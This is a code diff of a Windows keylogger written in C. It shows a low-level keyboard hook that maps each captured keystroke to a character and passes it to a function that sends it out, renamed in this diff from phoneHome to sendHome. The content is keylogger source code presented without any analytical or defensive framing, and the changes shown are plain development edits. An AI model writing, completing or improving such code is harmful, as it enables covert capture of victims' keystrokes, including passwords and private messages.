@@ -10,6 +10,7 @@ void keylogger()
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
+
 	UnhookWindowsHookEx(hook);
 }
 
@@ -37,7 +38,7 @@ LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 	};
 
 	TCHAR temp[10];
-	char szString[10];
+	char string[10];
 	size_t nNumCharConverted;
 
 	if (nCode == HC_ACTION)
@@ -49,17 +50,17 @@ LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 			int code = hookStruct->vkCode;
 
 			if (!shift && code >= 'A' && code <= 'Z') 
-				sprintf_s(szString, 10, "%c", code + 32);
+				sprintf_s(string, 10, "%c", code + 32);
 			else if (shift && code >= 48  && code <= 57)  
-				sprintf_s(szString, 10, shiftMap[code - 48]);
+				sprintf_s(string, 10, shiftMap[code - 48]);
 			else if (shift && code >= 186 && code <= 192) 
-				sprintf_s(szString, 10, shiftMap[code - 176]);
+				sprintf_s(string, 10, shiftMap[code - 176]);
 			else if (shift && code >= 219 && code <= 222) 
-				sprintf_s(szString, 10, shiftMap[code - 202]);
+				sprintf_s(string, 10, shiftMap[code - 202]);
 			else 
-				sprintf_s(szString, 10, "%s", map[code]);
+				sprintf_s(string, 10, "%s", map[code]);
 	
-			phoneHome(szString);
+			sendHome(string);
 		}
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
